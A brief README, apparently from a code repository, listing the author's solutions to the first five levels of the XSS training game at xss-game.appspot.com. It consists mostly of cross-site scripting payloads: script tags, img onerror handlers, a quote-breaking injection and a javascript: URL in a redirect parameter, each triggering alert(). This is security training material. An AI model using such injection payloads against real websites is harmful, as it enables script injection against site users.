# Game-xss
My solutions for https://xss-game.appspot.com

##Step 1
```javascript
<script>alert(1);</script>
```
##Step 2
```html
<img src="forbidden" onerror="alert('1')" />
```
##Step 3
Replace
```html
<img src="/static/level3/cloud3.jpg">
```
replace with
```html
<img src="/static/level3/#6.jpg" onerror="alert(1)">
```
##Step 4
```javascript
1');alert('1
```
##Step 5
```html
<img src="/static/logos/level5.png"/>
```
```html
<img src="/static/logos/level566.png" onerror="alert('1')"/>
```
replace with
or rewrite url with get parameter
```
https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert('GG')
```
